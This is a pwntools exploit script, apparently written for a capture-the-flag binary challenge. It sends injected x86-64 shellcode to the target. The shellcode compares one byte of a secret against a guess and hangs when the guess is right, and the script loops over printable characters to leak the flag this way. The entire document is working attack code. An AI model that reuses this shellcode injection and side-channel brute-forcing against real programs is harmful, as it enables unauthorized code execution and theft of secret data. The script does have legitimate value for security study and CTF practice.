# encoding:utf-8
from pwn import *
context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']
file = './chall'
e = ELF(file)
context.arch = e.arch
libc = e.libc
rlibc = ''
ip = ''
port = ''
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

# run(1)
shellcode = '''
mov rdi,[rsp+0x18]
movzx  eax, byte ptr [rdi+{}]
l:cmp rax,{}
jnz l
'''
# shellcode = asm(shellcode)
# print len(shellcode)
# dbg('breakrva 0xD87')
# sea('>>', shellcode + '\xc3')
# rc()
# shell()
flag = ''
def brute(c):
    global shellcode, flag
    # print "now: {} ,try: {}".format(flag, p8(c))
    run(1)

    try:
        # dbg('breakrva 0xD87')
        code = shellcode.format(hex(len(flag)), hex(c))
        # print code
        code = asm(code)
        sea('>>', code + '\xc3')
        p.recv(timeout=0.1)
    except:
        if c == 0:
            print "flag:" + flag
            exit()
        else:
            flag += chr(c)
            print flag
    finally:
        p.close()
tab = [i for i in range(32, 127)] + [0]
print tab
while True:
    for i in tab:
        brute(i)
